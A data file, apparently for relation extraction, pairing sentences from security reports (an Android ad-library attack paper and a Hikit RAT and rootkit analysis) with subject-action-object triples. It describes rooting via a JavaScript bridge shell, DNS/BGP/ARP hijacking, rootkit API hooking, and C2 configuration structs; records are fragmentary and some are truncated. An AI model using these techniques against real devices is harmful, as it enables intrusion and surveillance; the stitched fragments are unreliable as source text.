conduct more targeted attacks, which we call                                 \n\u201cSidewinder Targeted Attacks.\u201d In this paper we                                  \nexplain the security risks from such attacks, in                                 \nwhich an attacker can intercept and use private                                  \ninformation uploaded from ad libraries to                                        \nprecisely locate targeted areas such as a CEO\u2019s                                  \noffice or specific conference rooms": [{"conduct": {"A": "conduct", "S": "an attacker", "O": ["more targeted attacks"]}}, {"intercept and use": {"A": "intercept and use", "S": "an attacker", "O": ["to precisely locate targeted areas such as a CEO\u2019s office or specific conference rooms", "private information uploaded from ad libraries"]}}], " The\nattacker can hijack the network where the\ntargeted victim resides": [{"hijack": {"A": "hijack", "S": "The attacker", "O": ["the network where the targeted victim resides"]}}], " Listing 1 is a sample\nJavascript snippet to execute shell command": [{"execute": {"A": "execute", "S": "a sample Javascript snippet", "O": ["shell command"]}}], " In this screenshot, the victim\u2019s\ninstalled app list, clipboard, a photo taken from\nthe back camera, an audio clip, and a video clip\nhave been uploaded, with the GPS location\nintercepted from the ad library": [{"intercepted": {"A": "intercepted", "O": ["the GPS location", "from the ad library"]}}, {"been uploaded": {"A": "been uploaded", "O": ["the victim\u2019s installed app list, clipboard, a photo taken from the back camera, an audio clip, and a video clip"]}}], "\nThus, as long as attackers can get the JBOH shell,\nthey have the tools to obtain root on most\nAndroid phone models": [{"obtain": {"A": "obtain", "S": "they", "O": ["on most Android phone models", "root"]}}], "\n\nBGP hijacking takes over groups of IP addresses,\ncorrupting Internet routing tables by breaking\nBGP sessions or injecting fake BGP information": [{"corrupting": {"A": "corrupting", "S": "BGP hijacking", "O": ["by breaking BGP sessions or injecting fake BGP information", "Internet routing tables"]}, "takes over": {"A": "takes over", "S": "BGP hijacking", "O": ["groups of IP addresses"]}}], "\nThey can also alter the clipboard content to\nachieve phishing goals": [{"alter": {"A": "alter", "S": "They", "O": ["to achieve phishing goals", "the clipboard content"]}}], " Furthermore, the                                  \nattackers can exploit several Android                                            \nvulnerabilities to get valuable private information                              \nor to launch more advanced attacks": [{"exploit": {"A": "exploit", "S": "the attackers", "O": ["to get valuable private information"]}}], " After that,        \nthey can inject exploits only into the targeted         \ntraffic to launch further attacks": [{"inject": {"A": "inject", "S": "they", "O": ["only into the targeted traffic", "to launch further attacks", "exploits"]}}], "\n</section>                                                                         <section>\n<heading>Root Exploits and Code Injection</heading>\nOne direct threat posed by JBOH is to use the\nJBOH shell (Listing 1) to download exe- cutables\nand use them to root the device": [{"use": {"A": "use", "O": ["the JBOH shell", "to download exe- cutables"]}}, {"use": {"A": "use", "O": ["to root the device", "them"]}}], " We successfully launched Man-in-the-\nMiddle (MITM) attacks and intercepted the data\nuploaded to the remote server": [{"intercepted": {"A": "intercepted", "S": "We", "O": ["the data uploaded to the remote server"]}, "launched": {"A": "launched", "S": "We", "O": ["Man-in-the- Middle (MITM) attacks"]}}], " For example, the user\nmay copy a link to visit and the background\nmalicious service can change that link to a\nphishing site": [{"change": {"A": "change", "S": "the background malicious service", "O": ["to a phishing site", "that link"]}}], " We verified                             \nthat Android apps with these two permissions can                             \nauthenticate themselves with the user\u2019s Google                               \naccount, allowing access to Google Play and the                              \nability send app installation requests": [{"authenticate": {"A": "authenticate", "S": "Android apps with these two permissions", "O": ["themselves", "with the user\u2019s Google account"]}}], "                                                        \n                                                                         \nTo launch more sophisticated attacks like sending                        \nSMS or taking pictures, the attackers may use                            \nJava reflection to call other APIs from the\nJavascript bridge": [{"taking": {"A": "taking", "S": "the attackers", "O": ["pictures"]}, "sending": {"A": "sending", "S": "the attackers", "O": ["SMS"]}}], " By DNS\nhijacking, attackers can effectively access all the\ntraffic to ad servers": [{"access": {"A": "access", "S": "attackers", "O": ["By DNS hijacking", "all the traffic to ad servers"]}}], " Attackers successfully\ncompromised many DNS servers, including the\nones from Google and Godaddy<fn>24</fn>": [{"compromised": {"A": "compromised", "S": "Attackers", "O": ["many DNS servers, including the ones from Google and Godaddy"]}}], " Through the                          \nJavascript bridge, attackers can install apps of                             \nchoice (e.g., an attacker\u2019s phishing app) to any                             \ndevices registered in user\u2019s account in the                                  \nbackground without user consent": [{"install": {"A": "install", "S": "attackers", "O": ["to any devices registered in user\u2019s account in the background", "apps of choice (e.g., an attacker\u2019s phishing app)", "without user consent"]}}], "\n                                                                              \nAs a proof-of-concept attack scenario, a malicious                            \napp with these two permissions can query/insert/                              \nalter the system icon settings and modify                                     \nlegitimate icons of some security- sensitive apps,                            \nsuch as banking apps, to a phishing website": [{"query/insert/ alter": {"A": "query/insert/ alter", "S": "a malicious app with these two permissions", "O": ["the system icon settings"]}, "modify": {"A": "modify", "S": "a malicious app with these two permissions", "O": ["to a phishing website", "egitimate icons of some security- sensitive apps, such as banking apps"]}}], " Here,                                  \nwe explain how attackers can invoke Android                                      \nservices for tasks including taking photos, calling                              \nphone numbers, sending SMS, reading from/                                        \nwriting to the clipboard, etc": [{"invoke": {"A": "invoke", "S": "attackers", "O": ["for calling phone numbers"]}}], "                                      \n</section>\n\n<section>                                                                             \n<heading>Targeting Victims Based on Ad Traffic</heading>                                        \nIn this section, we explain the risks of victims\u2019                            \ndevices being tracked and targeted through                                   \nad traffic": [{"being tracked and targeted": {"A": "being tracked and targeted", "O": ["through ad traffic", "victims\u2019 devices"]}}], "\n\nARP hijacking (or spoofing) in IDC<fn>26</fn> is done to\nhijack the traffic to the ad server in the IDC where\nthe ad server locates through fake ARP packets": [{"hijack": {"A": "hijack", "S": "ARP hijacking (or spoofing) in IDC", "O": ["the traffic to the ad server in the IDC where the ad server locates through fake ARP packets"]}}], " In later sections, we\ndiscuss attacking (\u201cwarhead\u201d) and targeting\n(\u201choming\u201d) components in detail and show how a\ncombination of these components can launch\npowerful and precise attacks on target devices": [{"launch": {"A": "launch", "S": "a combination of these components", "O": ["powerful and precise attacks", "on target devices"]}}], " Given that this ad                            \nlibrary loads ads using HTTP, if the host app has                        \nthe corresponding permissions (e.g., CALL\nPHONE), attackers over the network can abuse                             \nthese interfaces to do malicious things (e.g.,                           \nutilizing the makeCall interface to dial phone                           \nnumbers without the user\u2019s consent)": [{"utilizing": {"A": "utilizing", "S": "attackers over the network", "O": ["the makeCall interface", "to dial phone numbers without the user\u2019s consent"]}}], " The panel also\npins down the GPS location of the victim\u2019s\ndevice onto a Google Map widget": [{"pins": {"A": "pins", "S": "The panel", "O": ["down the GPS location of the victim\u2019s device", "onto a Google Map widget"]}}], " Though\nad libraries may not have the incentive to abuse                             \nusers\u2019 private and sensitive data, this is not the                           \ncase with the attackers eavesdropping or hijacking\nthe HTTP traffic": [{"eavesdropping or hijacking": {"A": "eavesdropping or hijacking", "S": "the attackers", "O": ["the HTTP traffic"]}}], "                                     \n                                                                             \nIn this context, DNS hijacking is done to subvert\nthe resolution of Domain Name System (DNS)                                   \nqueries through modifying the behavior of DNS                                \nservers so that they serve fake DNS information": [{"subvert": {"A": "subvert", "S": "DNS hijacking", "O": ["through modifying the behavior of DNS servers so that they serve fake DNS information", "the resolution of Domain Name System (DNS) queries"]}}], "\nTo minimize detection chances, the attacker can\nchoose to take action on important targets only,\nignoring all other devices": [{"choose": {"A": "choose", "S": "the attacker", "O": ["to take action on important targets only"]}}], " They also need to be cautious about         \nwhich privileged interfaces are exposed to the       \nad providers, in case of malicious ads or            \nattackers hijacking the communication channels": [{"hijacking": {"A": "hijacking", "S": "malicious ads or attackers", "O": ["the communication channels"]}}], " Unfortunately, several                             \nwell-known attacks can be used to achieve                                    \nlarge-scale monitoring, including DNS hijacking,                             \nBGP hijacking, and ARP hijacking in IDC": [{"achieve": {"A": "achieve", "S": "several well-known attacks", "O": ["large-scale monitoring"]}}], "\nThis enables attackers to monitor all traffic to\nspecific IPs": [{"monitor": {"A": "monitor", "S": "attackers", "O": ["all traffic to specific IPs"]}}], " Once\nloaded, the code can obtain context as described\nin Listing 4, or call DexClassLoaderload<fn>12</fn> to\ninject new classes from the attackers\u2019 DEX\nfiles to register callbacks to take pictures/\nrecord videos": [{"call": {"A": "call", "S": "the code", "O": ["DexClassLoaderload", "to inject new classes from the attackers\u2019 DEX files to register callbacks to take pictures/ record videos"]}}], "\n</section>\n\n<section>\nBack to square one:\n\nFrom what we have seen so far, the malware is being delivered as a Microsoft Office Word (.doc) email\nattachment, containing a malicious macro called AutoOpen": [{"delivered": {"A": "delivered", "O": ["the malware"]}}, {}], "\n\nAs seen, the malware uses a number of RATs to control its victims or track their activity": [{"control": {"A": "control", "S": "the malware", "O": ["its victims"]}, "uses": {"A": "uses", "S": "the malware", "O": ["a number of RATs"]}, "track": {"A": "track", "S": "the malware", "O": ["their activity"]}}], " Stolen data was packed and sent encrypted over HTTP\nrandom ports": [{"packed": {"A": "packed", "O": ["Stolen data"]}, "sent": {"A": "sent", "O": ["over HTTP random ports", "Stolen data"]}}], "\n\nThe malware is in plain view, modifying commonplace registry entries, such as the startup configurations,\nand not covering its tracks": [{"modifying": {"A": "modifying", "S": "The malware", "O": ["commonplace registry entries"]}}], " The RAT functionality provides an attacker with the ability to\nestablish a phantom network within a victim\u2019s infrastructure by having individual instances of Gen 2 DLL\nlisten for incoming connections on local ports (presumably, NAT\u2019d ports) and accept commands from\nthe inbound connection": [{"listen": {"A": "listen", "S": "individual instances of Gen 2 DLL", "O": ["on local ports", "for incoming connections"]}, "accept": {"A": "accept", "S": "individual instances of Gen 2 DLL", "O": ["from the inbound connection", "commands"]}}], " It is unclear why this code exists given that the DLL will check\nthe Driver version and correct the Driver if necessary prior to reaching the portion of the code that\nreports the\t\n \u00a0DRIVER_MIN_VERSION.\t\n \u00a0It is possible that the second Driver version check is a last ditch\neffort to ensure the correct Driver is installed": [{"ensure": {"A": "ensure", "S": "the second Driver version check", "O": ["the correct Driver is installed"]}}], "<doc>                                                                                                            \t\n \u00a0\n\t\n \u00a0\n<section>\n<heading>Hikit Analysis</heading>\n</section>\n<section>\n<heading>Basic Description</heading>\nHikit consists of at least two generations of malware that provides basic RAT functionality": [{"provides": {"A": "provides", "S": "at least two generations of malware", "O": ["basic RAT functionality"]}}], " In order for the\nDLL to load, Gen 2 (starting with Gen 2.1) uses a loader application (referred to simply as \u201cthe\nLoader\u201d)": [{"uses": {"A": "uses", "S": "Gen 2", "O": ["In order for the DLL to load", "a loader application"]}}], "\n</section>\n<section>\n<heading>Gen 2 Driver</heading>\nThe Gen 2 sub-family, beginning with Gen 2.0 Beta, employs a Windows device driver (\u201cthe Driver\u201d) to\nhide aspects of the DLL\u2019s functionality from normal system processes": [{"employs": {"A": "employs", "S": "The Gen 2 sub-family, beginning with Gen 2.0 Beta", "O": ["a Windows device driver (\u201cthe Driver\u201d)", "to hide aspects of the DLL\u2019s functionality from normal system processes"]}}], "\n        0x22FFFC                                                                                                             Purge all hooks and hidden items (\"unhook\")\n</table>\nThe Driver is capable of hiding processes (by PID, not name), system modules, services, network\nconnections, listening ports, directories (and by extension, files), as well as registry keys and values": [{"hiding": {"A": "hiding", "S": "The Driver", "O": ["services"]}}], " The remote shell function uses\nthe standard pipe redirection method for interfacing a network application (in this case, the DLL) to a\nhidden command shell.\t\n</section>\n \u00a0\n<section>\n<heading>Command: \u00a0file </heading>\u00a0\nThe\t\n \u00a0file\t\n \u00a0command provides an attacker with a variety of disk access options such as listing\ndirectories, changing the current directory, and uploading and downloading files": [{"listing": {"A": "listing", "S": "The file command", "O": ["directories"]}, "uploading": {"A": "uploading", "S": "The file command"}, "downloading": {"A": "downloading", "S": "The file command"}}], " The difference between the two exports is that DllRegisterServer\t\n \u00a0can take an\noptional command line argument of the letter \u201cu\u201d which will instruct the main thread to uninstall the Gen\n1 system from a victim\u2019s computer": [{"uninstall": {"A": "uninstall", "S": "the main thread", "O": ["from a victim\u2019s computer", "the Gen 1 system"]}}], " The dwHikitVersion\t\nfield allows the client and\nthe DLL to ensure that they have a compatible communication scheme in place prior to executing\ncommands": [{"allows": {"A": "allows", "S": "The dwHikitVersion field", "O": ["prior to executing commands", "to ensure that they have a compatible communication scheme in place", "the client and the DLL"]}}], " Despite the\ndifferent models, both variants of the Loader load the embedded DLL in the exact same way": [{"load": {"A": "load", "S": "both variants of the Loader", "O": ["the embedded DLL", "in the exact same way"]}}], " The standalone Loaders use\nthe\t\nMatrixMain\t\nfunction while the DLL Loaders will call the\t\nStartServer\t\nfunction": [{"use": {"A": "use", "S": "The standalone Loaders", "O": ["the MatrixMain function"]}}, {"call": {"A": "call", "S": "the DLL Loaders", "O": ["the StartServer function"]}}], "\n\t\n \u00a0\n</table>\nIf the i\t\n \u00a0parameter is given, the DLL will install itself as a service on the victim\u2019s machine": [{"install": {"A": "install", "S": "the DLL", "O": ["itself", "on the victim\u2019s machine", "as a service"]}}], " With the handle open to the rootkit driver, the RAT\nfunctionality code deletes the service in order to reduce the visible footprint of the new driver": [{"deletes": {"A": "deletes", "S": "the RAT functionality code", "O": ["in order to reduce the visible footprint of the new driver", "the service"]}}], " To further\nreduce the footprint of the driver, the RAT functionality code also uses the cloaking functionality of the\nrootkit to hide the DLL\u2019s PID, any references to the GUID {4AE26357-79A3-466D-A6D9-\nFC38BFB67DEA}, the DLL\u2019s service names (e.g": [{"hide": {"A": "hide", "S": "the RAT functionality code", "O": ["the DLL\u2019s PID"]}}], " The\nDriver also creates a symbolic link to the device using the same name but under the\t\n\\DosDevices\\\t\n\ntree.\t\u00a0\t\n\nFor reasons unknown, the authors of the Driver used code from a Chinese blog that details how to hide\nnetwork connections on Windows Vista and later decided to keep the example IP address within the\ncode": [{"creates": {"A": "creates", "S": "The Driver", "O": ["to the device", "using the same name but under the \\DosDevices\\ tree", "a symbolic link"]}}], "\n</section>\n<section>\n<heading>Command: \u00a0proxy (Gen 1.2 and later), socks5 \u00a0(Gen 1.0 and 1.1) \u00a0</heading>\nThe\t\n \u00a0proxy\t\n \u00a0(or\t\n \u00a0socks5) command allows an attacker to utilize a Hikit-infected machine as a proxy": [{"utilize": {"A": "utilize", "S": "an attacker", "O": ["a Hikit-infected machine", "as a proxy"]}}], " In\norder to hide these items, the Driver hooks various Windows Kernel API calls": [{"hooks": {"A": "hooks", "S": "the Driver", "O": ["various Windows Kernel API calls", "In order to hide these items"]}}], " port forwarding) through\n                                  another Hikit sample\n       socks5        Gen 1.0      Establishes a forwarding proxy (retired in Gen 1.2)\n       proxy         Gen 1.2      Establishes a forwarding proxy\n       information   Gen 2.0      Returns the configuration for the Hikit infection\n                     Alpha\n       exit          Gen 1.0      Terminates a channel\n</table>\n</section>\n<section>\n<heading>Command: \u00a0shell \u00a0</heading>\nThe\t\n \u00a0shell\t\n \u00a0command activates a remote shell on the victim\u2019s computer": [{"activates": {"A": "activates", "S": "The shell command", "O": ["a remote shell", "on the victim\u2019s computer"]}}], "\n</section>\n<section>\n<heading>Functionality and Commands</heading>\nThe Hikit family has supported roughly the same set of commands since the first known samples of\nGen 1.0": [{"supported": {"A": "supported", "S": "The Hikit family", "O": ["since the first known samples of Gen 1.0", "roughly the same set of commands"]}}], "\n<code>\n        struct ImageHeader\n        {\n           DWORD dwImageEncodedSize;\n           DWORD dwImageSizeDecompressed;\n           DWORD EncodingKey;\n        };\n</code>\n\nLoadEmbeddedImage\t\n \u00a0copies the compressed embedded DLL into a newly allocated heap buffer and\nthen calls the function\t\n \u00a0decodeBuffer\t\n \u00a0(using the\t\n \u00a0EncodingKey\t\n \u00a0value) to decrypt the embedded DLL": [{"calls": {"A": "calls", "S": "LoadEmbeddedImage", "O": ["to decrypt the embedded DLL", "the function decodeBuffer (using the EncodingKey value)"]}, "copies": {"A": "copies", "S": "LoadEmbeddedImage", "O": ["the compressed embedded DLL", "into a newly allocated heap buffer"]}}], "\n\nAfter loading the embedded DLL image into memory, the Loader will either call the DLL\u2019s\t\n\nStartServer\t\nor\t\nMatrixMain\t\nfunction depending on the type of Loader": [{"loading": {"A": "loading", "S": "the Loader", "O": ["into memory", "the embedded DLL image"]}, "call": {"A": "call", "S": "the Loader", "O": ["the DLL\u2019s StartServer or MatrixMain function"]}}], " Once connected, the operator has\nthe basic Hikit functionalities available to them via commands such as file and shell": [{"has": {"A": "has", "S": "the operator", "O": ["the basic Hikit functionalities available to them", "via commands such as file and shell"]}}], " The DLL operates as a service, requiring an attacker is install the DLL as a\nservice at some point prior to activation": [{"is install": {"A": "is install", "S": "an attacker", "O": ["the DLL", "as a service", "at some point prior to activation"]}}], "\nWith the embedded DLL now decompressed into a heap buffer, LoadEmbeddedImage\t\n \u00a0calls\t\n \u00a0\nImageLoaderData::LoadDll\t\n \u00a0to manually load the DLL into memory": [{"load": {"A": "load", "S": "ImageLoaderData::LoadDll", "O": ["the DLL", "into memory"]}}, {"calls": {"A": "calls", "S": "LoadEmbeddedImage", "O": ["ImageLoaderData::LoadDll"]}}], " Both versions of the Loader begin by loading the embedded DLL from the Loader\u2019s resources\n(item 102 under the Group Icons resource tree), decrypting and decompressing the image into memory,\nthen manually loading the DLL into memory using a custom loading routine": [{"loading": {"A": "loading", "S": "Both versions of the Loader", "O": ["using a custom loading routine", "into memory", "the DLL"]}}], "\nUpon activation, the Driver will expose its interface by calling\t\nIoCreateDevice\t\nwith the name\n\\Device\\agony\t\n(for Gen 2.0 Beta samples), \\Device\\HTTPS\t\n(for Gen 2.1 samples),\t\n\n\\Device\\advcachemgr\t\n(for Gen 2.2 samples) or \\Device\\diskdump\t\n(for Gen 2.3 samples)": [{"calling": {"A": "calling", "S": "the Driver", "O": ["with the name \\Device\\agony (for Gen 2.0 Beta samples), \\Device\\HTTPS (for Gen 2.1 samples), \\Device\\advcachemgr (for Gen 2.2 samples) or \\Device\\diskdump (for Gen 2.3 samples)", "IoCreateDevice"]}}], " Additionally, the code also attempts to hide a service named \u201cHitx\u201d": [{"hide": {"A": "hide", "S": "the code", "O": ["a service named \u201cHitx\u201d"]}}], " The console is a text based application that takes a Gen 1.0 or Gen 1.2 infection\u2019s IP address\nand proceeds to connect and authenticate with the infected server": [{"connect and authenticate": {"A": "connect and authenticate", "S": "The console", "O": ["with the infected server"]}}], " The first\ngeneration of Hikit (referred to as \u201cGen 1\u201d) operates as a server and requires an externally exposed\nnetwork interface in order for an attacker to access the victim machine": [{"access": {"A": "access", "S": "an attacker", "O": ["the victim machine"]}}, {"operates": {"A": "operates", "S": "The first generation of Hikit (referred to as \u201cGen 1\u201d)", "O": ["as a server"]}}], " The DLL will send a legitimate SSL certificate as a means to disrupt heuristic IDS\nsensors that look for encrypted traffic": [{"send": {"A": "send", "S": "The DLL", "O": ["a legitimate SSL certificate", "as a means to disrupt heuristic IDS sensors that look for encrypted traffic"]}}], " If the uninstall argument exists,\t\n \u00a0mainThread\t\n \u00a0will simply remove the\nDriver from the victim\u2019s machine and terminate": [{"remove": {"A": "remove", "S": "mainThread", "O": ["the Driver", "from the victim\u2019s machine"]}}], " The\nRAT supports the following commands:\n<table>\n\n       Command       Introduced   Description\n       shell         Gen 1.0      Establishes a remote command shell on the victim machine\n       file          Gen 1.0      File managerment\n       connect       Gen 1.0      Establishes a tunnel connection (e.g": [{"supports": {"A": "supports", "S": "The RAT", "O": ["the following commands"]}}], " Following this, the DLL will then attempt to install the correct\nversion of the Driver prior to terminating": [{"install": {"A": "install", "S": "the DLL", "O": ["prior to terminating", "the correct version of the Driver"]}}], "\n\n\n\n\n\t\n \u00a0\n\f\t\n \u00a0\n\n<code>\n       struct Config\n       {\n          WCHAR wszComment[32];\n          C2ConfigInfo arrC2s[2];\n          ListeningPortConfig ListeningPorts[10];\n          int dwStartTime;\n          int dwEndTime;\n          __int16 Flags;\n          SYSTEMTIME sleepUntil;\n          __int16 unused_align2_2;\n          int fRunHidden;\n       };\n\n       struct C2ConfigInfo\n       {\n          WCHAR wszAddress[32];\n          __int16 wPort;\n          __int16 unused_align2;\n          int fValidC2;\n       };\n\n       struct ListeningPortConfig\n       {\n          unsigned __int16 wPort;\n          unsigned __int16 unused_align2;\n          int fReady;\n          SOCKET hSocket;\n          HANDLE hEvent;\n          HANDLE hListenerThread;\n       };\n\t\n</code>\n\nIn order to provide some level of stealth, the RAT will install a rootkit on 32-bit versions of Windows": [{"install": {"A": "install", "S": "the RAT", "O": ["on 32-bit versions of Windows", "a rootkit"]}}], "\n\nIn Gen 1.2, the communication between the infected machine and the attacker is encrypted using an\nXOR mask": [{"is encrypted": {"A": "is encrypted", "O": ["using an XOR mask", "the communication between the infected machine and the attacker"]}}], " The following table maps\nthe items the Driver can hide to the API function that the Driver hooks:\n<table>\n        Item                                                                                                                                                        API Function Hooked\n        Process ID                                                                                                                                                  ZwDeviceIoControlFile\n        (PID)\n        Registry Key                                                                                                                                                ZwEnumerateKey\n        Registry Value                                                                                                                                              ZwEnumerateValueKey\n        Directory                                                                                                                                                   QueryDirectoryFile\n\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0 \t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\n<footnote>\n1\n  \t\n \u00a0James\t\n \u00a0Antognini\t\n \u00a0and\t\n \u00a0Thomas\t\n \u00a0F.\t\n \u00a0Divine.\t\n \u00a0\u201cExtending\t\n \u00a0the\t\n \u00a0Microsoft\t\n \u00a0PassThru\t\n \u00a0NDIS\t\n \u00a0Intermediate\t\n \u00a0Driver\u2014Parts:\t\n \u00a0Two\t\n \u00a0IP\t\n \u00a0\nAddress\t\n \u00a0Blocking\t\n \u00a0NDIS\t\n \u00a0IM\t\n \u00a0Drivers\u201d.\t\n \u00a0December\t\n \u00a015,\t\n \u00a02003\t\n \u00a0\n2\n  \t\n \u00a0pudn.\t\n \u00a0\u201cAgony\t\n \u00a0Rootkit\t\n \u00a0code,\t\n \u00a0the\t\n \u00a0stability\t\n \u00a0and\t\n \u00a0can\t\n \u00a0be\t\n \u00a0useful\t\n \u00a0Driver\t\n \u00a0Develop\u201d.\t\n \u00a0\nhttp://en.pudn.com/downloads74/sourcecode/windows/vxd/detail265112_en.html.\t\n \u00a08\t\n \u00a0April\t\n \u00a02007.\t\n \u00a0\t\n \u00a0\n3\n  \t\n \u00a0CardMagic.\t\n \u00a0\u201c[Reserved]\t\n \u00a0NSI\t\n \u00a0Module\t\n \u00a0Hook:\t\n \u00a0Hiding\t\n \u00a0Port\t\n \u00a0Under\t\n \u00a0Windows\t\n \u00a0Vista\u201d.\t\n \u00a0http://forum.eviloctal.com/archiver/tid-\u00ad\u2010\n29604.html.\t\n \u00a08\t\n \u00a0July\t\n \u00a02007.\t\n</footnote>\n \u00a0\n\n\n\t\n \u00a0\n\f\t\n \u00a0\n\n\n       Item              API Function Hooked\n       Local Listening   ZwDeviceIoControlFile\n       Port\n       Remote            ZwDeviceIoControlFile\n       Endpoint\n       Loaded Drivers    ZwQuerySystemInformation\n\t\n</table>\n\nIn order to hide services, the Driver will access the memory of the services.exe process, locate the\nlinked list of services and remove the service entry that the Driver wishes to hide": [{"hide": {"A": "hide", "S": "the Driver", "O": ["he items"]}}, {"remove": {"A": "remove", "S": "the Driver", "O": ["the service entry that the Driver wishes to hide"]}, "hide": {"A": "hide", "S": "the Driver", "O": ["services"]}, "access": {"A": "access", "S": "the Driver", "O": ["the memory of the services.exe process"]}}, {"hooks": {"A": "hooks", "S": "the Driver", "O": ["the API function"]}}], "\n\n\n\n\n\t\n \u00a0\n\f\t\n \u00a0\n\n\nFrom a system objects perspective, Gen 2 samples produce up to three named events": [{"produce": {"A": "produce", "S": "Gen 2 samples", "O": ["up to three named events"]}}], "\n</section>\n<section>\n<heading>Gen 2 Analysis</heading>\nThe Gen 2 sub-family, like Gen 1.2, uses a DLL for the core of its RAT functionality": [{"uses": {"A": "uses", "S": "The Gen 2 sub-family", "O": ["for the core of its RAT functionality", "a DLL"]}}], " The authors of Gen 1 used freely available source code\nfound online for their removal function.<fn>4</fn>\n\n\n\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0 \t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\t\n \u00a0\n<footnote>\n4\n \t\n \u00a0PCAUSA.\t\n \u00a0\u201cProgrammatically\t\n \u00a0Installing\t\n \u00a0NDIS\t\n \u00a0Protocol\t\n \u00a0Drivers\u201d\t\n \u00a0http://www.ndis.com/ndis-\u00ad\u2010\ngeneral/ndisinstall/programinstall.htm.\t\n \u00a02\t\n \u00a0December\t\n \u00a02013.\t\n </footnote>\n \u00a0\n\n\n\t\n \u00a0\n\f\t\n \u00a0\n\n\nWhen the DLL activates, either by a call to\t\nDllEntryPoint\t\nor by calling\t\nDllRegisterServer\t\n\nwithout the u parameter,\t\nmainThread\t\nbegins by verifying the version of the Driver installed on the\nvictim\u2019s machine": [{"calling": {"A": "calling", "O": ["DllRegisterServer", "without the u parameter"]}}], " The Loaders,\nupon unloading, will call the StopServer function in order to shut down the embedded DLL": [{"call": {"A": "call", "S": "The Loaders", "O": ["the StopServer function", "upon unloading", "in order to shut down the embedded DLL"]}}], "\nThe DLL\u2019s RAT functionality provides basic features such as network port forwarding (proxying), file\ntransfer, and remote command shell": [{"provides": {"A": "provides", "S": "The DLL\u2019s RAT functionality", "O": ["remote command shell"]}}], "\nThe communication between the Gen 2 malware and the C2 (or other Gen 2 malware, in the case of\nthe internal routing functionality) is encrypted using a simple DWORD XOR scheme": [{"is encrypted": {"A": "is encrypted", "S": "The communication between the Gen 2 malware and the C2", "O": ["using a simple DWORD XOR scheme"]}}], " Each Gen 2 infection can support up to 10 listening ports": [{"support": {"A": "support", "S": "Each Gen 2 infection", "O": ["up to 10 listening ports"]}}], "\nImageLoaderData::LoadDll\t\n \u00a0interprets the PE/COFF header of the DLL image, loads the image\ninto the appropriate memory configuration, performs the necessary relocation operations, and calls the\t\n\nDllMain\t\n(DLL\u2019s entry point) function": [{"calls": {"A": "calls", "S": "ImageLoaderData::LoadDll", "O": ["the DllMain (DLL\u2019s entry point) function"]}, "loads": {"A": "loads", "S": "ImageLoaderData::LoadDll", "O": ["the image", "into the appropriate memory configuration"]}}], " The second generation of Hikit\n(referred to as \u201cGen 2\u201d) uses the more traditional client model and beacons out to an attacker\u2019s C2\nserver": [{"beacons": {"A": "beacons", "S": "The second generation of Hikit (referred to as \u201cGen 2\u201d)", "O": ["out to an attacker\u2019s C2 server"]}}], " The DLL contains only two exports: DllEntryPoint\t\n \u00a0and\t\n \u00a0\nDllRegisterServer.\t\n \u00a0Ultimately, both exports generate a new thread of the same function\n(\u201cmainThread\u201d)": [{"generate": {"A": "generate", "S": "both exports", "O": ["a new thread of the same function (\u201cmainThread\u201d)"]}}], " it doesn\u2019t match the specified\nversion), the DLL installs the version of the Driver found within the DLL\u2019s resource section (under the\t\n\nBIN\t\nresource tree).\t\n \u00a0\t\n \u00a0\n\nWith the Driver version verified (or forcibly corrected by installing the appropriate Driver), the DLL will\ninstruct the Driver to use a specified string (for Gen 1.0 and Gen 1.1 samples) or a DWORD (for Gen\n1.2 samples) as the acknowledgment value to send to a connecting client who requests the appropriate\nURL": [{"installs": {"A": "installs", "S": "the DLL", "O": ["the version of the Driver found within the DLL\u2019s resource section (under the BIN resource tree)"]}}, {"installing": {"A": "installing", "O": ["the appropriate Driver"]}}], " The RAT functionality code then activates the service and opens a handle to\ndevice driver\u2019s interface (e.g": [{"activates": {"A": "activates", "S": "The RAT functionality code", "O": ["the service"]}}], " The purpose of this behavior is to allow the DLL to interact\nwith the network without utilizes the WinSock API which could potentially reveal the presence of Hikit": [{"interact": {"A": "interact", "S": "the DLL", "O": ["with the network", "without utilizes the WinSock API which could potentially reveal the presence of Hikit"]}}], "\n</section>\n<section>\n<heading>Command: \u00a0information </heading>\nGen 2 samples rely on a configuration in order to know where the C2 server exists along with other\noperational aspects such as the name of its service and operational times": [{"rely": {"A": "rely", "S": "Gen 2 samples", "O": ["in order to know where the C2 server exists", "on a configuration"]}}], "\nWhen the Driver establishes a new channel, the DLL generates a runtime data structure before\ngenerating a new thread (\u201cHikitThreadFunc\u201d) which will service any request coming from the new\nchannel": [{"generating": {"A": "generating", "S": "the DLL", "O": ["a new thread 